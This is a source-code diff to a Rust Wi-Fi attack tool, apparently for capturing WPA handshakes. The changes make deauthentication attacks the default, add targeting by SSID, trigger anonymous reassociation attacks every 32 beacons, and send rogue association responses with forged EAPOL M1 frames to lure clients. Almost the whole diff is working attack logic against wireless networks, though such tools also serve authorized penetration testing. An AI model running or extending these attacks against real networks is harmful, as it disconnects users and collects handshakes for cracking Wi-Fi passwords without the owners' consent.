@@ -5,16 +5,15 @@ mod database;
 mod devices;
 mod eventhandler;
 mod gps;
+mod matrix;
 mod pcapng;
 mod rawsocks;
 mod snowstorm;
-mod matrix;
 mod status;
 mod tabbedblock;
 mod tx;
 mod ui;
 mod util;
-
 
 extern crate libc;
 extern crate nix;
@@ -38,7 +37,7 @@ use gps::GPSDSource;
 use itertools::{Either, Itertools};
 use libc::EXIT_FAILURE;
 use libwifi::frame::components::{MacAddress, RsnAkmSuite, RsnCipherSuite, WpaAkmSuite};
-use libwifi::frame::{DataFrame, EapolKey, NullDataFrame};
+use libwifi::frame::{Beacon, DataFrame, EapolKey, NullDataFrame};
 use nix::unistd::geteuid;
 
 use nl80211_ng::channels::WiFiChannel;
@@ -72,8 +71,8 @@ use crate::ascii::get_art;
 use crate::auth::HandshakeStorage;
 use crate::devices::{APFlags, AccessPoint, Station, WiFiDeviceList};
 use crate::eventhandler::{EventHandler, EventType};
-use crate::snowstorm::Snowstorm;
 use crate::matrix::MatrixSnowstorm;
+use crate::snowstorm::Snowstorm;
 use crate::status::*;
 use crate::ui::{print_ui, MenuType};
 use crate::util::parse_ip_address_port;
@@ -136,8 +135,8 @@ struct Arguments {
     /// Optional tar output files.
     notar: bool,
     #[arg(long)]
-    /// Optional send deauths.
-    deauth: bool,
+    /// Optional do NOT send deauths (will try other attacks only).
+    nodeauth: bool,
 }
 
 #[derive(Default)]
@@ -348,10 +347,22 @@ impl OxideRuntime {
                 (vec![], vec![])
             };
 
-        if !target_vec.is_empty() {
-            let formatted: Vec<String> = target_vec.iter().map(|mac| mac.to_string()).collect();
-            let result = formatted.join(", ");
-            println!("Target List: {}", result);
+        if !target_vec.is_empty() || !starget_vec.is_empty() {
+            // Print MAC Targets
+            if !target_vec.is_empty() {
+                let formatted: Vec<String> = target_vec.iter().map(|mac| mac.to_string()).collect();
+                let result = formatted.join(", ");
+
+                println!("MacAddr Target List: {}", result);
+            }
+            // Print SSID targets
+            if !starget_vec.is_empty() {
+                let sformatted: Vec<String> =
+                    starget_vec.iter().map(|ssid| ssid.to_string()).collect();
+                let sresult = sformatted.join(", ");
+
+                println!("SSID Target List: {}", sresult);
+            }
             if cli_autoexit {
                 println!("Auto-Exit Set - will shutdown when hashline collected for targets.");
             }
@@ -471,7 +482,7 @@ impl OxideRuntime {
         // Decide whether to use matrix or snowfall for UI state
         let mut rng = rand::thread_rng();
         // 50/50 change of getting snowflakes or the matrix
-        let use_snowstorm = rng.gen_bool(0.5); 
+        let use_snowstorm = rng.gen_bool(0.5);
 
         // Setup Filename writing
 
@@ -552,13 +563,26 @@ impl OxideRuntime {
         }
     }
 
-    fn get_target_success(&self) -> bool {
+    fn get_target_success(&mut self) -> bool {
         let mut complete = true;
-        if self.targets.is_empty() {
+        if self.targets.is_empty() && self.stargets.is_empty() {
             return false;
         }
         for target in &self.targets {
             if !self.handshake_storage.has_complete_handshake_for_ap(target) {
+                complete = false;
+            }
+        }
+
+        for target in &self.stargets {
+            let ap = self
+                .access_points
+                .get_device_by_ssid(target)
+                .unwrap_or(continue);
+            if !self
+                .handshake_storage
+                .has_complete_handshake_for_ap(&ap.mac_address)
+            {
                 complete = false;
             }
         }
@@ -604,6 +628,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
         Ok(frame) => {
             source = *frame.src().unwrap_or(&MacAddress([0, 0, 0, 0, 0, 0]));
             destination = *frame.dest();
+            let mut beacon_count = 999;
 
             // Pre Processing
             match frame.clone() {
@@ -676,6 +701,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                                     &bssid,
                                     oxide.counters.sequence2(),
                                 );
+                                ap.interactions += 1;
                                 let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
                                 oxide.status_log.add_message(StatusMessage::new(
                                     MessageType::Info,
@@ -683,9 +709,13 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                                 ));
                             }
                         }
+                        beacon_count = ap.beacon_count;
                         ap.beacon_count += 1;
                     }
                     let _ = m1_retrieval_attack(oxide, &bssid);
+                    if (beacon_count % 32) == 0 {
+                        let _ = anon_reassociation_attack(oxide, &bssid)?;
+                    }
                     if oxide.deauth {
                         let _ = deauth_attack(oxide, &bssid);
                     }
@@ -837,7 +867,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                             let bssid = auth_frame.header.address_3;
 
                             // First let's add it to our unassociated clients list:
-                            oxide.unassoc_clients.add_or_update_device(
+                            let station = oxide.unassoc_clients.add_or_update_device(
                                 client,
                                 &Station::new_unassoc_station(client, signal, vec![]),
                             );
@@ -851,6 +881,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                                     oxide.counters.sequence3(),
                                 );
                                 write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
+                                station.interactions += 1;
                             }
                         } else if auth_frame.auth_seq == 2 {
                             //// From AP
@@ -1023,7 +1054,7 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
 
                     // Handle client as not yet associated
                     if client_mac.is_real_device() && client_mac != oxide.rogue_client {
-                        oxide.unassoc_clients.add_or_update_device(
+                        let station = oxide.unassoc_clients.add_or_update_device(
                             client_mac,
                             &Station::new_unassoc_station(
                                 client_mac,
@@ -1034,6 +1065,30 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                                 vec![],
                             ),
                         );
+
+                        if ap_mac == oxide.rogue_client {
+                            let rogue_ssid = ssid.unwrap_or("".to_string());
+                            // We need to send an association response back
+                            let frx = build_association_response(
+                                &client_mac,
+                                &ap_mac,
+                                &ap_mac,
+                                oxide.counters.sequence3(),
+                                &rogue_ssid,
+                            );
+                            write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
+                            // Then an M1
+                            let m1: Vec<u8> = build_eapol_m1(
+                                &client_mac,
+                                &ap_mac,
+                                &ap_mac,
+                                oxide.counters.sequence3(),
+                                &oxide.rogue_m1,
+                            );
+                            oxide.rogue_essids.insert(client_mac, rogue_ssid);
+                            write_packet(oxide.tx_socket.as_raw_fd(), &m1)?;
+                            station.interactions += 2;
+                        }
                     };
                     // Add AP
                     if ap_mac.is_real_device() {
@@ -1047,29 +1102,6 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                         );
                         oxide.access_points.add_or_update_device(ap_mac, &ap);
                     };
-
-                    if ap_mac == oxide.rogue_client {
-                        let rogue_ssid = ssid.unwrap_or("".to_string());
-                        // We need to send an association response back
-                        let frx = build_association_response(
-                            &client_mac,
-                            &ap_mac,
-                            &ap_mac,
-                            oxide.counters.sequence3(),
-                            &rogue_ssid,
-                        );
-                        write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
-                        // Then an M1
-                        let m1: Vec<u8> = build_eapol_m1(
-                            &client_mac,
-                            &ap_mac,
-                            &ap_mac,
-                            oxide.counters.sequence3(),
-                            &oxide.rogue_m1,
-                        );
-                        oxide.rogue_essids.insert(client_mac, rogue_ssid);
-                        write_packet(oxide.tx_socket.as_raw_fd(), &m1)?;
-                    }
                 }
                 Frame::AssociationResponse(assoc_response_frame) => {
                     oxide.counters.association += 1;
@@ -1270,19 +1302,6 @@ fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
                         dest_mac
                     };
 
-                    if dest_mac == oxide.rogue_client {
-                        oxide.status_log.add_message(StatusMessage::new(
-                            MessageType::Error,
-                            format!("RTS: {} => {}", frame.source, frame.destination),
-                        ));
-                        let frx = build_cts(&source_mac);
-                        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
-                    } else {
-                        oxide.status_log.add_message(StatusMessage::new(
-                            MessageType::Error,
-                            format!("RTS NOT US: {} => {}", frame.source, frame.destination),
-                        ));
-                    }
                     let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                     let signal = radiotap.antenna_signal.unwrap_or(
                         AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
@@ -1701,6 +1720,7 @@ fn handle_data_frame(
                 oxide.counters.sequence2(),
             );
             let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+            ap.interactions += 1;
             if oxide.handshake_storage.has_m1_for_ap(&ap_addr) {
                 return Ok(());
             }
@@ -1826,7 +1846,7 @@ fn handle_null_data_frame(
     // Check PS State:
     if !powersave && station_addr != oxide.rogue_client {
         // Client is awake... potentially... try reassociation attack?
-        anon_reassociation_attack(oxide, &ap_addr)?;
+        //anon_reassociation_attack(oxide, &ap_addr)?;
     }
 
     Ok(())
@@ -1903,7 +1923,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         cli.notransmit,
         cli.rogue,
         cli.target,
-        cli.deauth,
+        !cli.nodeauth,
         filename.clone(),
         cli.gpsd,
         cli.band,
